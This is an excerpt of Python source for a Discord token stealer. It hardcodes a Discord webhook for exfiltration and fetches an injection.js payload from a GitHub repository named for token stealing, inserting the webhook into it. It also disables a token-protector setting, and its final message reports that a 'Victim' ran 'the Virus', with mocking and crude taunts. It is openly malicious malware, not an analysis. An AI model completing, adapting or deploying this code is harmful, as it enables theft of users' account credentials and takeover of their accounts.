...
config = {
    ...
    'webhook': "https://discord.com/api/webhooks/1055782414741413938/42LweTCuqJ6MFac1J0SsM6e2yxMen9YElPCxjrRjL_IeP8zT_evv51WIwGlxwjsdop8c",
...
interface_view_text = ('___________.__ __           .__               \n\__    ___/|__|  | __ ___  _|__| ______  _  __\n  |    |   |  |  |/ / \  \/ /  |/ __ \ \/ \/ /\n  |    |   |  |    <   \   /|  \  ___/\     / \n  |____|   |__|__|_ \   \_/ |__|\___  >\/\_/  \n                   \/               \/        ')
                        ...
                        if os.path.exists(inj_path):
                            if self.startup_loc not in argv[0]:
                                try:
                                    ...
                                    pass
                            f = httpx.get('https://raw.githubusercontent.com/Bylue/discord-token-stealer-script/main/injection.js').text.replace("%WEBHOOK%", self.webhook)
                            try:
        ...
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['Just raped your token-protector shit LMAOOOO'] = "https://github.com/bylue"
    ...
    def finish(self):
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'{Victim} Just ran the Virus',
                        'url': 'https://derwardumm.de/',
                    },
                    'color': 444444,
                    ...
                    'footer': {
                        'text': 'I think he will be mad if he knews. 🤣'
                    }
                }
            ]
        }
